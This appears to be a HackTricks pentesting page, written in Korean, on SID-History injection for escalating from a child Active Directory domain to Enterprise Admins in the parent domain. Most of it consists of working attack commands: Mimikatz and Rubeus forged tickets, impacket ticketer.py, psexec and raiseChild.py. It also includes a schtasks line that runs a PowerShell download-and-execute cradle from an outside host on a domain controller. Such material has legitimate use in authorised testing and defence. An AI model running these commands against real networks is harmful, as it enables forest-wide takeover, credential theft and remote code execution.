# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

**SID History Injection Attack**의 초점은 **도메인 간 사용자 마이그레이션**을 지원하면서 이전 도메인의 리소스에 대한 지속적인 접근을 보장하는 것입니다. 이는 **사용자의 이전 보안 식별자(SID)를 새로운 계정의 SID History에 통합함으로써** 이루어집니다. 특히, 이 과정은 상위 도메인에서 고급 권한 그룹(예: Enterprise Admins 또는 Domain Admins)의 SID를 SID History에 추가하여 무단 접근을 부여하도록 조작될 수 있습니다. 이 악용은 상위 도메인 내의 모든 리소스에 대한 접근을 부여합니다.

이 공격을 실행하는 두 가지 방법이 있습니다: **Golden Ticket** 또는 **Diamond Ticket**의 생성입니다.

**"Enterprise Admins"** 그룹의 SID를 찾으려면 먼저 루트 도메인의 SID를 찾아야 합니다. 식별 후, Enterprise Admins 그룹 SID는 루트 도메인의 SID에 `-519`를 추가하여 구성할 수 있습니다. 예를 들어, 루트 도메인 SID가 `S-1-5-21-280534878-1496970234-700767426`인 경우, "Enterprise Admins" 그룹의 결과 SID는 `S-1-5-21-280534878-1496970234-700767426-519`가 됩니다.

또한 **Domain Admins** 그룹을 사용할 수도 있으며, 이는 **512**로 끝납니다.

다른 도메인의 그룹(SID, 예: "Domain Admins")을 찾는 또 다른 방법은 다음과 같습니다:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Golden Ticket (Mimikatz) with KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
더 많은 정보는 golden tickets에 대해 확인하세요:

{{#ref}}
golden-ticket.md
{{#endref}}

### 다이아몬드 티켓 (Rubeus + KRBTGT-AES256)
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
다이아몬드 티켓에 대한 자세한 내용은 다음을 확인하세요:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
손상된 도메인의 KRBTGT 해시를 사용하여 루트 또는 엔터프라이즈 관리자의 DA로 상승:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
공격으로 획득한 권한을 사용하여 새 도메인에서 예를 들어 DCSync 공격을 실행할 수 있습니다:

{{#ref}}
dcsync.md
{{#endref}}

### 리눅스에서

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) 수동 사용
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

이것은 **자식 도메인에서 부모 도메인으로의 상승을 자동화하는** Impacket 스크립트입니다. 스크립트는 다음이 필요합니다:

- 대상 도메인 컨트롤러
- 자식 도메인의 관리자 사용자에 대한 자격 증명

흐름은 다음과 같습니다:

- 부모 도메인의 Enterprise Admins 그룹에 대한 SID를 얻습니다.
- 자식 도메인의 KRBTGT 계정에 대한 해시를 검색합니다.
- Golden Ticket을 생성합니다.
- 부모 도메인에 로그인합니다.
- 부모 도메인의 Administrator 계정에 대한 자격 증명을 검색합니다.
- `target-exec` 스위치가 지정된 경우, Psexec를 통해 부모 도메인의 도메인 컨트롤러에 인증합니다.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## 참고 문헌

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
